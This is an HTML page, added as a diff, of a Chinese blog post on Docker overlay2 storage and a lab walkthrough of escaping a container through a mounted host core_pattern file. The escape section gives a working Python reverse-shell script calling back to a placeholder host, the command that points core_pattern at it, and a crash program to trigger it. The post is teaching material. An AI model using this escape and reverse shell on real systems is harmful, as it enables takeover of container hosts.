@@ -1,0 +1,427 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[Docker容器安全3]Docker文件存储 &amp; 挂载宿主机 procfs 容器逃逸 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[Docker容器安全3]Docker文件存储 &amp; 挂载宿主机 procfs 容器逃逸 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Docker文件存储背景知识
+Docker 镜像
+Docker 镜像是一个由多个层（layers）组成的只读模板。这些层堆叠在一起，构成了一个完整的文件系统，镜像可以用来创建容器。
+层（Layer）
+每个层通常对应于 Dockerfile ..." />
+    <meta name="keywords" content="docker,容器安全" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [Docker容器安全3]Docker文件存储 &amp; 挂载宿主机 procfs 容器逃逸
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-05-11
+              </span>
+              <span>
+                11 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/sxFzAdaZk/" class="post-tag">
+                  # docker
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/uVChpOuTBN/" class="post-tag">
+                  # 容器安全
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/docker-rong-qi-an-quan-3docker-wen-jian-cun-chu-and-gua-zai-su-zhu-ji-procfs-rong-qi-tao-yi.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="docker文件存储背景知识">Docker文件存储背景知识</h1>
+<h2 id="docker-镜像">Docker 镜像</h2>
+<p>Docker 镜像是一个由多个层（layers）组成的只读模板。这些层堆叠在一起，构成了一个完整的文件系统，镜像可以用来创建容器。</p>
+<h2 id="层layer">层（Layer）</h2>
+<p>每个层通常对应于 Dockerfile 中的一条指令（如 FROM、COPY、RUN 等）。这些层是只读的，并且通过叠加技术（union file system）组合在一起，形成了镜像的最终内容。</p>
+<h2 id="层的堆叠和镜像">层的堆叠和镜像</h2>
+<ul>
+<li>只读层：这些层是只读的，并且是镜像的一部分。每个层包含了与前一层的差异部分。这些层共同构成了镜像的文件系统。</li>
+<li>可写层：当容器启动时，会在镜像的所有只读层之上添加一个新的可写层，这一层是容器专有的，存储运行容器时的所有变更。</li>
+<li>每个容器都有其自己的可写容器层，并且所有更改都存储在该容器层中，所以多个容器可以共享对同一基础映像的访问，但具有自己的数据状态。下</li>
+</ul>
+<p><img src="https://skyblu3519.github.io/post-images/1715441777002.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1715441784258.png" alt="" loading="lazy"></p>
+<h2 id="写时复制copy-on-write-cow机制">写时复制（Copy-on-Write, CoW）机制</h2>
+<p>当容器中的文件被修改时，存储驱动程序会执行写时复制操作，以确保只读层不被修改，并将更改写入到可写层中。具体步骤如下：</p>
+<ol>
+<li>查找文件：当需要修改一个文件时，存储驱动程序首先会在镜像层中搜索该文件。这个过程从最新的镜像层开始，一层一层向下搜索，直到找到文件为止。</li>
+<li>Copy-up操作：一旦找到文件，存储驱动程序会将该文件的副本复制到可写容器层中。这个过程称为“copy-up”操作。</li>
+<li>修改文件：文件被复制到可写层后，所有对该文件的修改都会在可写层中进行。容器中的进程将只能看到可写层中的修改后的文件，而不会再访问只读层中的原始文件。</li>
+</ol>
+<p>不同的存储驱动程序（如 AUFS、OverlayFS、Overlay2）处理写时复制操作的具体方式可能有所不同，OverlayFS是推荐的存储驱动程序。</p>
+<h2 id="overlay2存储驱动">Overlay2存储驱动</h2>
+<p>OverlayFS 是 Linux 内核中一种联合文件系统，它允许将多个目录合并为一个逻辑上的单一目录结构。其核心概念是通过将多个层（通常是只读层和一个可写层）合并，提供一个统一的文件系统视图。</p>
+<h3 id="主要概念">主要概念</h3>
+<ul>
+<li>lowerdir：只读层，包含基础文件系统。</li>
+<li>upperdir：可写层，记录所有的写操作。</li>
+<li>workdir：工作目录，OverlayFS 操作所需的临时存储。</li>
+</ul>
+<p>overlay 和 overlay2 是 Docker 中基于 OverlayFS 的两种存储驱动程序。</p>
+<h3 id="overlay">overlay</h3>
+<ul>
+<li>overlay 是最早的基于 OverlayFS 的存储驱动程序。</li>
+<li>它支持简单的两层结构（一个 lowerdir 和一个 upperdir）。</li>
+<li>对于较大的镜像和大量层的场景，性能和可扩展性方面有一定的局限性。</li>
+</ul>
+<h3 id="overlay2">overlay2</h3>
+<ul>
+<li>overlay2 是改进后的存储驱动程序，克服了 overlay 的一些局限性。</li>
+<li>支持多层结构（multiple lowerdirs），即可以将多个只读层（lowerdir）叠加起来，进一步提高了灵活性和可扩展性。</li>
+<li>在性能和稳定性方面都有所提升，适合处理更复杂的镜像和层次结构。</li>
+</ul>
+<h3 id="测试">测试</h3>
+<p>使用<code>docker info</code>查看docker使用的文件驱动</p>
+<pre><code># docker info | grep &quot;Storage Driver&quot;
+...
+ Storage Driver: overlay2
+  Backing Filesystem: extfs
+  Supports d_type: true
+  Using metacopy: false
+  Native Overlay Diff: true
+  userxattr: false
+...
+</code></pre>
+<p>拉取一个ubuntu:20.04镜像：</p>
+<pre><code># docker pull ubuntu:20.04
+20.04: Pulling from library/ubuntu
+d4c3c94e5e10: Pull complete
+Digest: sha256:874aca52f79ae5f8258faff03e10ce99ae836f6e7d2df6ecd3da5c1cad3a912b
+Status: Downloaded newer image for ubuntu:20.04
+docker.io/library/ubuntu:20.04
+</code></pre>
+<p>镜像拉取了一层，查看 overlay2 的目录：</p>
+<pre><code># ls -l /var/lib/docker/overlay2/
+total 8
+drwx--x--- 3 root root 4096 May 11 18:38 105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6
+drwx------ 2 root root 4096 May 11 18:38 l
+</code></pre>
+<p>overlay2 目录下出现了一个镜像层目录和一个<code>l</code>目录，首先来查看一下<code>l</code>目录的内容：</p>
+<pre><code># ls -l /var/lib/docker/overlay2/l
+total 4
+lrwxrwxrwx 1 root root 72 May 11 18:38 DT325SQS52JQUKKHRELWLMM64Z -&gt; ../105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/diff
+</code></pre>
+<p>可以看到l目录是一堆软连接，把一些较短的随机串软连到镜像层的 diff 文件夹下，这样做是为了避免达到mount命令参数的长度限制。</p>
+<p>再看下这个镜像层中的内容：</p>
+<pre><code># ls -l /var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/
+total 8
+drwxr-xr-x 17 root root 4096 May 11 18:39 diff
+-rw-r--r--  1 root root   26 May 11 18:38 link
+</code></pre>
+<p>这里包含 diff目录 和 link文件：</p>
+<ul>
+<li>diff目录：包含了该层的所有文件和目录内容。这是一个可写层，存储了在该层中所做的所有更改。<br>
+<img src="https://skyblu3519.github.io/post-images/1715442172976.png" alt="" loading="lazy"></li>
+<li>link文件：内容为该镜像层的短 ID</li>
+</ul>
+<pre><code># cat /var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/link
+DT325SQS52JQUKKHRELWLMM64Z
+</code></pre>
+<p>在 Docker 镜像或容器的详细信息中，<code>GraphDriver</code> 部分提供了关于存储驱动程序的具体信息。</p>
+<pre><code># docker inspect ubuntu:20.04
+
+......省略部分
+&quot;GraphDriver&quot;: {
+    &quot;Data&quot;: {
+        &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/merged&quot;,
+        &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/diff&quot;,
+        &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/work&quot;
+    },
+    &quot;Name&quot;: &quot;overlay2&quot;
+},
+......
+</code></pre>
+<p>字段解释：</p>
+<ul>
+<li>Name: 指定存储驱动程序的名称。这里面，存储驱动程序为 overlay2。</li>
+<li>Data: 包含与 overlay2 存储驱动程序相关的具体目录信息。
+<ul>
+<li>MergedDir: 指向合并目录，该目录提供了容器运行时的统一视图。当容器运行时，MergedDir 是实际挂载点，它将多个只读层和一个可写层合并在一起，提供一个完整的文件系统视图。</li>
+<li>UpperDir: 指向上层目录，该目录包含可写层的内容。当容器对文件系统进行写操作时，修改会写入 UpperDir。这是写时复制（Copy-on-Write）机制的一部分。</li>
+<li>WorkDir: 指向工作目录，该目录用于 OverlayFS 的临时存储操作。WorkDir 是 OverlayFS 所需的，支持文件系统操作如创建和删除文件时的临时存储。</li>
+</ul>
+</li>
+</ul>
+<p>启动容器</p>
+<pre><code>docker run -d --name=ubt ubuntu: 20.04 tail -f /dev/null
+</code></pre>
+<p><code>/var/lib/docker/overlay2/</code>多了个表示容器层的目录</p>
+<pre><code># ls -l /var/lib/docker/overlay2/
+total 12
+drwx--x--- 3 root root 4096 May 11 21:44 105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6
+drwx--x--- 5 root root 4096 May 11 21:44 76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8
+drwx------ 2 root root 4096 May 11 21:44 l
+</code></pre>
+<p>查看容器层目录内容</p>
+<pre><code># ls -l /var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8
+total 20
+drwxr-xr-x 2 root root 4096 May 11 21:44 diff
+-rw-r--r-- 1 root root   26 May 11 21:44 link
+-rw-r--r-- 1 root root   57 May 11 21:44 lower
+drwxr-xr-x 1 root root 4096 May 11 21:44 merged
+drwx------ 3 root root 4096 May 11 21:44 work
+</code></pre>
+<p>文件解释：</p>
+<ul>
+<li>lower文件：该层依赖的所有下层的目录路径。<code>l</code>目录下的短链接</li>
+<li>merged目录：提供容器的合并文件系统视图。所有对文件系统的访问都会通过这个合并视图。</li>
+<li>work 目录: 用于 OverlayFS 操作的临时存储。</li>
+</ul>
+<p>在容器中写入一个文件<code>/home/test</code>，它会出现在<code>diff</code>和<code>merged</code>目录中</p>
+<pre><code># tree /var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/diff/
+/var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/diff/
+├── home
+│   └── test
+└── root
+
+
+# tree /var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/merged/home/
+/var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/merged/home/
+└── test
+</code></pre>
+<h1 id="挂载宿主机-procfs-逃逸">挂载宿主机 procfs 逃逸</h1>
+<h2 id="背景">背景</h2>
+<p><code>/proc/sys/kernel/core_pattern</code>文件用于配置生成进程核心转储（core dump）文件的模式，其内容定义了核心转储文件的命名模式和存储位置。当一个程序崩溃时，操作系统会生成一个核心转储文件，其中包含进程的内存快照、寄存器状态等信息。</p>
+<p>从 2.6.19 内核版本开始，Linux 支持在 <code>/proc/sys/kernel/core_pattern</code> 中使用新语法。如果该文件中的首个字符是管道符<code>|</code>，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。</p>
+<pre><code class="language-shell">|/usr/local/bin/core_handler %p %u %g %s %t %h %e
+</code></pre>
+<p>这样，当一个程序崩溃时，核心转储信息会被传递给 <code>/usr/local/bin/core_handler</code> 脚本进行处理。其中占位符的解释：</p>
+<ul>
+<li><code>%p</code>：进程 ID</li>
+<li><code>%u</code>：用户 ID</li>
+<li><code>%g</code>：组 ID</li>
+<li><code>%s</code>：进程的信号号</li>
+<li><code>%t</code>：时间戳</li>
+<li><code>%h</code>：主机名</li>
+<li><code>%e</code>：可执行文件名</li>
+</ul>
+<h2 id="攻击思路">攻击思路</h2>
+<p>所以这个的原理就是当<code>/proc/sys/kernel/core_pattern</code>被挂载到容器中时，可以在容器中写一个恶意脚本，根据前面的知识这个脚本在真实主机中的位置是可以找到的。然后编辑<code>/proc/sys/kernel/core_pattern</code>使用管道符指向该脚本，再写一个可以使进程崩溃的脚本触发，让物理执行这个脚本，进而获得物理机的shell实现容器逃逸。</p>
+<h2 id="实验">实验</h2>
+<p>创建一个容器并挂载 <code>/proc</code> 目录</p>
+<pre><code class="language-shell">docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
+</code></pre>
+<p>如果找到两个 <code>core_pattern</code> 文件，那可能就是挂载了宿主机的 procfs</p>
+<pre><code class="language-shell">find / -name core_pattern
+</code></pre>
+<p>查看容器的挂载路径</p>
+<pre><code class="language-shell">mount | grep overlay
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1715442187875.png" alt="" loading="lazy"></figure>
+<p>从返回可以知道，写文件在物理机的路径为</p>
+<pre><code class="language-shell">/var/lib/docker/overlay2/8b524daaa1e201d8e6706f9974fabbe7dfd6e7bd574508ae56278bee0d7d7c8b/diff
+/var/lib/docker/overlay2/8b524daaa1e201d8e6706f9974fabbe7dfd6e7bd574508ae56278bee0d7d7c8b/merged
+</code></pre>
+<p>安装 vim 和 gcc</p>
+<pre><code class="language-shell">apt-get update -y &amp;&amp; apt-get install vim gcc -y
+</code></pre>
+<p>创建一个反弹 Shell 的 py 脚本<code>/tmp/.t.py</code></p>
+<pre><code class="language-python">#!/usr/bin/python3
+import  os
+import pty
+import socket
+lhost = &quot;IP&quot;
+lport = 9999
+def main():
+   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+   s.connect((lhost, lport))
+   os.dup2(s.fileno(), 0)
+   os.dup2(s.fileno(), 1)
+   os.dup2(s.fileno(), 2)
+   os.putenv(&quot;HISTFILE&quot;, '/dev/null')
+   pty.spawn(&quot;/bin/bash&quot;)
+   # os.remove('/tmp/.t.py')
+   s.close()
+if __name__ == &quot;__main__&quot;:
+   main()
+</code></pre>
+<p>给 Shell 赋予执行权限</p>
+<pre><code class="language-python">chmod 777 /tmp/t.py
+</code></pre>
+<p>写入反弹 shell 到目标的 proc 目录下</p>
+<pre><code class="language-python">echo -e &quot;|/var/lib/docker/overlay2/8b524daaa1e201d8e6706f9974fabbe7dfd6e7bd574508ae56278bee0d7d7c8b/merged/tmp/t.py \rcore    &quot; &gt;  /host/proc/sys/kernel/core_pattern
+</code></pre>
+<p>在攻击主机上开启一个监听，然后在容器里运行一个可以崩溃的程序</p>
+<pre><code class="language-c">vim t.c
+#include&lt;stdio.h&gt;
+int main(void)  {
+   int *a  = NULL;
+   *a = 1;
+   return 0;
+}
+gcc t.c -o t
+./t
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#docker%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86">Docker文件存储背景知识</a>
+<ul>
+<li><a href="#docker-%E9%95%9C%E5%83%8F">Docker 镜像</a></li>
+<li><a href="#%E5%B1%82layer">层（Layer）</a></li>
+<li><a href="#%E5%B1%82%E7%9A%84%E5%A0%86%E5%8F%A0%E5%92%8C%E9%95%9C%E5%83%8F">层的堆叠和镜像</a></li>
+<li><a href="#%E5%86%99%E6%97%B6%E5%A4%8D%E5%88%B6copy-on-write-cow%E6%9C%BA%E5%88%B6">写时复制（Copy-on-Write, CoW）机制</a></li>
+<li><a href="#overlay2%E5%AD%98%E5%82%A8%E9%A9%B1%E5%8A%A8">Overlay2存储驱动</a>
+<ul>
+<li><a href="#%E4%B8%BB%E8%A6%81%E6%A6%82%E5%BF%B5">主要概念</a></li>
+<li><a href="#overlay">overlay</a></li>
+<li><a href="#overlay2">overlay2</a></li>
+<li><a href="#%E6%B5%8B%E8%AF%95">测试</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA-procfs-%E9%80%83%E9%80%B8">挂载宿主机 procfs 逃逸</a>
+<ul>
+<li><a href="#%E8%83%8C%E6%99%AF">背景</a></li>
+<li><a href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">攻击思路</a></li>
+<li><a href="#%E5%AE%9E%E9%AA%8C">实验</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/docker-rong-qi-an-quan-2linux-capabilities-and-te-quan-mo-shi-rong-qi-tao-yi/">
+              <h3 class="post-title">
+                [Docker容器安全2]Linux Capabilities &amp; 特权模式容器逃逸
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
